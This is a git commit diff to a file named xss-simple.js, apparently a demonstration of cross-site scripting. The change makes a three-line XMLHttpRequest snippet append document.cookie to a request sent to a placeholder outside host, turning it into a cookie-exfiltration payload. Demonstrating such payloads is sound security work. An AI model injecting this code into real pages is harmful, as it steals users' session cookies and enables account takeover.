7be5181f93664572616b4cf492ef9d3a12ab027f
securesitepolicy <35103775+securesitepolicy@users.noreply.github.com>
2018-03-01 11:34:58 -0500

    Update xss-simple.js

--- xss-simple.js
+++ xss-simple.js
@@ -1,3 +1,3 @@
 var xhr = new XMLHttpRequest(); 
-xhr.open('GET', 'https://some-example-where-data-could-go.com/'); 
+xhr.open('GET', 'https://some-example-where-data-could-go.com?cookie=' + document.cookie); 
 xhr.send();
